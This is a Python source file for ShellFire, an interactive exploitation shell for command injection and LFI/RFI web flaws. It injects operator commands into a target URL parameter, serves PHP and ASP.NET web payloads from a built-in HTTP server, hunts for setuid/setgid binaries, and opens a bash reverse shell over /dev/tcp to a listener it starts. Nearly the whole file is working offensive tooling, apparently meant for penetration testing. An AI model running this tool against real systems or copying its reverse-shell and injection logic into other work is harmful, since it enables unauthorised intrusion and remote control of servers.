#!/bin/env python3
# Thanks to Offensive-Security for inspiring this!
# Written by unix-ninja
# Aug 2016

import argparse
import json
import os
import readline
import requests
import select
import socket
import sys
import threading
import time

from config import Configs
from commands import command_list
from payloads import get_aspnet_payload, get_php_payload
from plugin_collection import PluginCollection
#from pydantic import BaseModel

############################################################
## Version Check

if (sys.version_info < (3, 0)):
  sys.stderr.write("[!] Error! Must execute this script with Python3.");
  sys.exit(2)

############################################################
## Configs

cfg = Configs()

############################################################
## Ephemeral states

http_running = False
revshell_running = False
plugins = PluginCollection('plugins')
userinput = None

############################################################
## Payloads

def payload_aspnet():
  cfg.payload = get_aspnet_payload(cfg.marker)
  cfg.payload_type = "ASP.NET"

def payload_php():
  cfg.payload = get_php_payload(cfg.marker)
  cfg.payload_type = "PHP"

############################################################
## Parse options

parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
parser.add_argument('-c', dest='config', action='store', nargs='?', default=None, const='default', help='load a named config on startup.')
parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
args = parser.parse_args()

############################################################
## Functions

def show_help(cmd=None):
  if cmd and cmd[0:1] == '.':
    cmd = cmd[1:]
  if cmd in command_list:
    if len(command_list[cmd]["help_text"]):
      sys.stdout.write("".join(command_list[cmd]["help_text"]))
    else:
      sys.stdout.write("command doesn't have help text\n")
  else:
    sys.stdout.write("Available commands:")
    for cmd_key in command_list:
      sys.stdout.write("%s\n" % command_list[cmd_key]["prefix"])


def http_server(port):
  ## super simple http. we can probably make this more robust.
  ## set up network listener first
  addr = ''
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.settimeout(1)
  sock.bind((addr, port))
  sock.listen(1)
  ## server loop
  while http_running == True:
    try:
      if not conn:
        conn, addr = sock.accept()
      request = conn.recv(1024)

      http_response = "HTTP/1.1 200 OK\n\n" + cfg.payload + "\n"

      ## send payload to the client
      conn.send(bytes(http_response, 'utf-8'))
      conn.close()
      conn = None
    except Exception as e:
      if args.debug:
        sys.stderr.write("[!] Err. socket.error : %s\n" % e)
      pass
  sys.stdout.write("[*] HTTP Server stopped\n")

def rev_shell(addr, port):
  ## setup listener for reverse shell
  port = int(port)
  global revshell_running
  revshell_running = True
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.bind((addr, port))
  sock.listen(1)
  conn, client_address = sock.accept()

  ## listener loop
  while True:
    socket_list = [conn, sys.stdin]
    read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])

    ## wait for connections
    for s in read_sockets:
      if s == conn:
        data = s.recv(4096)
        if not data:
          revshell_running = False
          return
        else:
          sys.stdout.write(data)
          sys.stdout.flush()
      else:
        msg = input()
        conn.send(msg)

  ## cleanup
  conn.close()
  revshell_running = False
  return

def cmd_auth(cmd):
  ## configure HTTP Basic auth settings
  if len(cmd) > 1:
    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0])+1:].split(":",1)
    cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
  else:
    sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
  return

def cmd_config(cmd):
  ## manage our configs
  if len(cmd) > 3:
    sys.stdout.write("[!] Invalid parameters for .config\n")
    return
  elif len(cmd) > 1:
    if len(cmd) == 3:
      name = cmd[2] + ".cfg"
    else:
      name = 'default.cfg'
    config_path = os.path.expanduser("~") + "/.config/shellfire/"
    name = config_path + name
    if cmd[1] == "save":
      ## make sure our directory exists
      if not os.path.isdir(config_path):
        os.mkdir(config_path)
      ## save our config to json
      with open(name, 'w') as my_config:
        my_config.write(cfg.dump())
        sys.stdout.write("[*] Config saved.\n")
    elif cmd[1] == "load":
      ## load json into our config
      try:
        with open(name, 'r') as my_config:
          cfg.load(json.load(my_config))
          sys.stdout.write("[*] Config restored.\n")
      except:
        sys.stdout.write("[!] Unable to restore config!\n")
  return

def cmd_cookies(cmd):
  ## configure cookies to be sent to target
  if len(cmd) < 2:
    sys.stdout.write("[*] cookies: %s\n" % (cfg.cookies))
  else:
    try:
      cmd.pop(0)
      cfg.cookies = json.loads(" ".join(cmd))
    except Exception as e:
      sys.stderr.write("[!] %s\n" % e)
  return

def cmd_encode(cmd):
  ## if no params passed, display current encoding plugins
  if len(cmd) == 1:
    sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
    return False
  ## Set our encoding plugins!
  ## let's remove ".encode" from our cmd
  cmd.pop(0)
  ## reset our chain
  cfg.encode_chain = []
  ## try to load our plugins
  try:
    for c in cmd:
      if c != "|" and c != "''" and c != '""':
        if c in plugins.plugins:
          cfg.encode_chain.append(c)
        else:
          cfg.encode_chain = []
          sys.stdout.write("[!] Invalid plugin %s\n" % (c))
          return False
  except:
    pass
  return False

def cmd_find(cmd):
  ## run "find" on remote target
  if len(cmd) != 2:
    sys.stdout.write("[!] Invalid parameters\n")
    return False
  if cmd[1] == "setgid":
    userinput = "find / -type f -perm -02000 -ls"
  elif cmd[1] == "setuid":
    userinput = "find / -type f -perm -04000 -ls"
  else:
    sys.stderr.write("[!] Invalid parameters\n")
    return False
  return True

def cmd_help(cmd):
  if len(cmd) == 2:
    show_help(cmd[1])
  else:
    show_help()
  return

def cmd_history(cmd):
  ## configure history settings for shellfire (via readline)
  if len(cmd) == 1:
    if os.path.isfile(cfg.history_file):
      sys.stdout.write("[*] History writing is enabled\n")
    else:
      sys.stdout.write("[*] History writing is disabled\n")
  else:
    if cmd[1] == "clear":
      readline.clear_history()
      sys.stdout.write("[*] History is cleared\n")
    elif cmd[1] == "save":
      with open(cfg.history_file, 'a'):
        os.utime(cfg.history_file, None)
      sys.stdout.write("[*] History writing is enabled\n")
    elif cmd[1] == "nosave":
      os.remove(cfg.history_file)
      sys.stdout.write("[*] History writing is disabled\n")
  return

def cmd_http(cmd):
  ## control our local http server
  global http_running
  if len(cmd) == 1:
    if http_running == True:
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
      sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
    else:
      sys.stdout.write("[*] HTTP server is not running\n")
    return
  if cmd[1] == "start":
    if http_running == False:
      if len(cmd) > 2:
        try:
          cfg.http_port = int(cmd[2])
        except Exception as e:
          sys.stderr.write("[!] Invalid port value: %s\n" % (cmd[2]))
          return False
      s = threading.Thread(target=http_server, args=(cfg.http_port,))
      s.start()
      http_running = True
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
    else:
      sys.stderr.write("[!] HTTP server already running\n")
  elif cmd[1] == "stop":
    if http_running == True:
      http_running = False
      time.sleep(1)
    else:
      sys.stderr.write("[!] HTTP server already stopped\n")
  elif cmd[1] == "payload":
    if cmd[2] == "aspnet":
      payload_aspnet()
    elif cmd[2] == "php":
      payload_php()
    else:
      sys.stderr.write("[!] Unrecognized payload type\n")
      return
    sys.stdout.write("[*] HTTP payload set: %s\n" % cfg.payload_type)
  return

def cmd_marker(cmd):
  ## set the marker for our rce payloads
  ## this will determine boundaries to split and clean output
  if len(cmd) != 2:
    sys.stderr.write("[!] Invalid parameters\n")
    return
  cfg.marker = cmd[1]
  sys.stdout.write("[*] Payload output marker set\n")
  return

def cmd_method(cmd):
  ## configure HTTP method to use against the target
  if len(cmd) > 2:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .method <method>\n")
    return
  if len(cmd) == 2:
    if cmd[1] == "post":
      cfg.method = "post"
    else:
      cfg.method = "get"
  sys.stdout.write("[*] HTTP method set: %s\n" % cfg.method.upper())
  return

def cmd_phpinfo(cmd):
  ## trigger phpinfo payload
  userinput = "_show_phpinfo"
  return True

def cmd_post(cmd):
  ## configure POST data to send
  if len(cmd) < 2:
    cfg.post = {}
  else:
    cmd.pop(0)
    cfg.post = json.loads(" ".join(cmd))
  sys.stdout.write("[*] POST data set: %s\n" % cfg.post)
  return

def cmd_referer(cmd):
  ## set HTTP referer
  if len(cmd) > 1:
    cmd.pop(0)
    cfg.headers['Referer'] = " ".join(cmd)
  sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
  return

def cmd_headers(cmd):
  """List or configure the HTTP request headers
    .headers
    .headers default
    .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
  Args:
      cmd (Str): "default" to reset the headers, otherwise a JSON string of the preferred header set
  """
  if len(cmd) < 1:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .headers {\"X-EXAMPLE\": \"some_value_here\"}\n")
    sys.stderr.write("    .headers default\n")
    return
  elif len(cmd) == 1:
    sys.stdout.write("[*] Request headers are: \n")
    sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
    return
  try:
    cmd.pop(0)
    if "".join(cmd).strip() == "default":
      # Apply the default headers here
      cfg.headers = cfg.default_headers
      sys.stdout.write("[*] Set request headers back to default...\n")
    else:
      # Convert deserialize the json
      tmp_headers = json.loads(" ".join(cmd))
      
      # Upsert into cfg.headers
      for header in tmp_headers:
        if header not in cfg.headers:
          cfg.headers[header] = tmp_headers[header]
        else:
          if cfg.headers[header] != tmp_headers[header]:
            cfg.headers[header] = tmp_headers[header]
      
      # Sanity check
      sys.stdout.write("[*] Request headers are now: \n")
      sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
  except Exception as e:
    sys.stderr.write("[!] %s\n" % e)


def cmd_shell(cmd):
  ## initiate a reverse shell via rce
  if len(cmd) != 3:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .shell <ip_address> <port>\n")
    return
  sys.stdout.write("[*] Initiating reverse shell...\n")
  host = cmd[1]
  port = cmd[2]
  userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"

  # open our reverse shell in a new thread
  s = threading.Thread(target=rev_shell, args=(host, port))
  s.start()

  # make sure the thread is init before proceeding
  time.sleep(1)

  return True

def cmd_url(cmd):
  ## set URL for remote target
  if len(cmd) > 1:
    cfg.url = userinput[len(cmd[0])+1:]
  sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
  return

def cmd_useragent(cmd):
  ## set the user agenet to send to target
  if len(cmd) > 1:
    cfg.headers['User-Agent'] = userinput[len(cmd[0])+1:]
  sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
  return

############################################################
## Main App

def main():
  global http_running

  ## if we are generating a payload to stdout, do it now, then bail
  if args.payload:
    args.payload = args.payload.lower()
    if args.payload == "php":
      sys.stderr.write("[*] Generating PHP payload...\n")
      payload_php()
    elif args.payload == "aspnet":
      sys.stderr.write("[*] Generating ASP.NET payload...\n")
      payload_aspnet()
    else:
      sys.stderr.write("[*] Invalid payload!\n")
    sys.stdout.write(cfg.payload)
    sys.exit(1)

  ## show our banner
  sys.stdout.write(""" (                                            
  )\ )    )       (   (   (                    
  (()/( ( /(    (  )\  )\  )\ )  (   (      (   
  /(_)))\())  ))\((_)((_)(()/(  )\  )(    ))\  
  (_)) ((_)\  /((_)_   _   /(_))((_)(()\  /((_) 
  / __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))   
  \__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
  |___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
  """)
  sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
  sys.stdout.write("[*] Type '.help' to see available commands\n")
  if args.debug == True:
    sys.stdout.write("[*] Debug mode enabled.\n")

  requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

  ## if we specified to load a named config, do it now
  if args.config:
    cmd_config([".config", "load", args.config])

  ## setup history
  if os.path.isfile(cfg.history_file):
    try:
      readline.read_history_file(cfg.history_file)
    except:
      pass

  ## set initial payload for PHP
  payload_php()

  ## main loop
  while True:
    while revshell_running:
      time.sleep(0.1)
    ## reset command execution state each loop
    exec_cmd = False
    ## draw our prompt
    userinput = input('>> ')
    if not userinput:
      continue
    ## parse our input
    cmd = userinput.split()
    match cmd[0]:
      case ".exit" | ".quit":
        http_running = False
        if os.path.isfile(cfg.history_file):
            readline.write_history_file(cfg.history_file)
        sys.exit(0)
      case ".auth": cmd_auth(cmd)
      case ".config": cmd_config(cmd)
      case ".cookies": cmd_cookies(cmd)
      case ".encode": exec_cmd = cmd_encode(cmd)
      case ".find": exec_cmd = cmd_find(cmd)
      case ".help": cmd_help(cmd)
      case ".history": cmd_history(cmd)
      case ".http": cmd_http(cmd)
      case ".marker": cmd_marker(cmd)
      case ".method": cmd_method(cmd)
      case ".phpinfo": exec_cmd = cmd_phpinfo(cmd)
      case ".post": cmd_post(cmd)
      case ".referer": cmd_referer(cmd)
      case ".headers": cmd_headers(cmd)
      case ".shell": exec_cmd = cmd_shell(cmd)
      case ".url": cmd_url(cmd)
      case ".useragent": cmd_useragent(cmd)
      case other: exec_cmd = True

    ## execute our command to the remote target
    if exec_cmd:
      cmd = userinput

      ## let's run our input through our encoding plugins
      if len(cfg.encode_chain):
        try:
          for enc in cfg.encode_chain:
            cmd = plugins.plugins[enc].run(cmd)
        except:
          pass

      ## validate the URL format
      if '{}' in cfg.url:
        query = cfg.url.replace('{}', cmd.strip())
      else:
        if '?' in cfg.url:
          if 'cmd=' not in cfg.url:
            query = cfg.url + '&cmd=' + cmd
          else:
            query = cfg.url.replace('cmd=', 'cmd=' + cmd)
        else:
          query = cfg.url + cmd.strip()
      ## log debug info
      if args.debug:
        sys.stdout.write("[D] " + query + "\n")
      try:
        if cfg.method == "post":
          r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
        else:
          r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
        ## sanitize the output. we only want to see our commands if possible
        output = r.text.split(cfg.marker)
        if len(output) > 1:
          output = output[1]
        else:
          output = output[0]
        ## display our results
        sys.stdout.write(output + "\n")
        if userinput == '_show_phpinfo':
          file = 'phpinfo.html'
          fp = open(file, 'w')
          fp.write(output)
          fp.close()
          sys.stdout.write("[*] Output saved to " + file + "\n")
      except Exception as e:
        sys.stderr.write("[!] Unable to make request to target\n")
        sys.stderr.write("[!] %s\n" % e)
        sys.stdout.flush()

# Main entrypoint - let's not pollute the global scope ehre.
if __name__ == "__main__":
  main()